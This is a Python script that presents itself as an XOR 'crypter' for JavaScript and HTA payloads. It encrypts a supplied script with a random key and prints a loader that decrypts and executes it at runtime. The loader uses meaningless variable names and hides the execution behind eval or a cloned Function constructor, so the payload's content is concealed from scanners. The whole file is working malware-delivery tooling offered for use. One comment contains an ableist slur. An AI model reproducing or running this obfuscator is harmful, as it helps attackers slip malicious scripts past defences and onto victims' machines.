from itertools import cycle
import random
import os
import sys

code = """// watch?v=2h6seJ3xjWA

var {e0} = "{data}"
var {e1} = "{key}"
function {e2}({e0}, {e1}) {{
        var e = ""
        {e0} = {e0}.split("e")
        for(var i = 0; i < {e0}.length; i++) {{
                e += String.fromCharCode(({e0}[i]) ^ {e1}.charCodeAt(i%{e1}.length))
        }}
        return e
}}
Function.prototype.clone = function() {{
    var that = this
    var {e3} = function {e8}() {{return that.apply(this, arguments)}}
    for (var {e7} in this) {{
        if (this.hasOwnProperty({e7})) {{
            {e3}[{e7}] = this[{e7}]
        }}
    }}
    return {e3}
}}
var {e4} = Function.clone()
function {e5}(str) {{
    return {e4}(str)
}}
var {e6} = {e5}({e2}({e0}, {e1}))
{e6}()"""

def gen_key():
    alphanum = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789"
    return(''.join(random.choice(alphanum) for choice in range(64))) 

def ekript_js(js_source, key):
    crypted = ""


    for(x,y) in zip(js_source, cycle(key)):
        crypted += (str(x ^ ord(y))) + "e"
    return crypted[:len(crypted)-1] # Cut off the last "e" since im a retard

def make_js_loader_template(crypted_js, key):
    e = []
    for i in range(200):
          r = random.randint(5,20)
          if("e"*r not in e):
              e.append("e"*r)

    return(code.format(data=crypted_js, key=key, e0=e[0], e1=e[1], e2=e[2], e3=e[3], e4=e[4], e5=e[5], e6=e[6], e7=e[7], e8=e[8], e9=e[9]))
 
def make_hta_loader_template(crypted_js, key, hta_source):
    e = []
    for i in range(200):
          r = random.randint(5,20)
          if("e"*r not in e):
              e.append("e"*r)

    hta_header = hta_source.split(b"<script>")[0] + b"<script>"
    hta_footer = b"</script>" + hta_source.split(b"</script>")[1]

    # We can't use the JS code above because a lot of JScript (Javascript, basically) features are not included inside of HTA land
    code = hta_header.decode('utf-8')
    code += """
var data = "{}"
var x = "{}"
""".format(crypted_js, key)
    code += """
function dk(data, x) {
	var d = ""
	data = data.split("e")
	for(var i = 0; i < data.length; i++) {
		d += String.fromCharCode((data[i]) ^ x.charCodeAt(i%x.length))
	}
	return d
}
eval(dk(data, x))
"""
    code += hta_footer.decode('utf-8')
    return(code)



 
if __name__ == "__main__":
    is_hta = False
    try:
        sys.argv[1]
    except:
        print("eKirmani eKript: xor encryption for JS payloads. Thank you to eKirmani for being a huge inspiration for this project.")
        print("Usage: python3 ekript.py payload.js")
        print("[e] https://www.youtube.com/watch?v=2h6seJ3xjWA")
        exit()
    with open(sys.argv[1], "rb") as fd:
        js_source = fd.read()
        raw_source = js_source

    # Defo dealing with an HTA file, not a standard JS file
    if(b"<script>" in js_source and b"</script>" in js_source and b"<html>" in js_source and b"</html>" in js_source):
        is_hta = True
        js_source = js_source.split(b"<script>")[1].split(b"</script>")[0]

    key = gen_key()
    crypted_js = ekript_js(js_source, key)

    if(is_hta):
        print(make_hta_loader_template(crypted_js, key, raw_source))
    else:
        print(make_js_loader_template(crypted_js, key))





